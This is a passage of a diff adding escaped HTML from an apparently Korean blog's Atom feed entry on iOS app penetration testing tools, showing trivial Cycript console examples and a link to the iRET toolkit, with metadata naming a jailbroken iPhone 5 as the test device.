+&lt;span class=&quot;gp&quot;&gt;  cy#&lt;/span&gt; Math.pow&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;a, 3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;  cy#&lt;/span&gt; 5 + 7
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.veracode.com/iret-ios-reverse-engineering-toolkit-veracode&quot;&gt;iRET&lt;/a&gt; : iOS에서 실행 가능한 APP을 모의해킹 시 반복되는 작업을 줄이기 위한 도구로 python으로 제작&lt;/li&gt;
+&lt;/ul&gt;</content><author><name></name></author><category term="mobile" /><category term="iOS" /><summary type="html">디바이스 정보 : iPhone 5 (iOS 10.3.3 - h3lix jailbreak)</summary></entry></feed>
